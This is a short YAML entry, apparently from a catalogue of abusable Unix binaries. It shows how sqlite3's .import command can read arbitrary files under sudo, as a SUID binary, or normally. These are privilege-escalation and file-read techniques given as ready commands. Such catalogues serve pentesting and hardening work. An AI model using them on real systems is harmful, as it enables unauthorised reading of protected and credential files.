---
functions:
  sudo-enabled:
    - code: |
        LFILE=file_to_read
        sudo sqlite3 << EOF
        CREATE TABLE t(line TEXT);
        .import $LFILE t
        SELECT * FROM t;
        EOF
  suid-enabled:
    - code: |
        LFILE=file_to_read
        ./sqlite3 << EOF
        CREATE TABLE t(line TEXT);
        .import $LFILE t
        SELECT * FROM t;
        EOF
  file-read:
    - code: |
        LFILE=file_to_read
        sqlite3 << EOF
        CREATE TABLE t(line TEXT);
        .import $LFILE t
        SELECT * FROM t;
        EOF
---
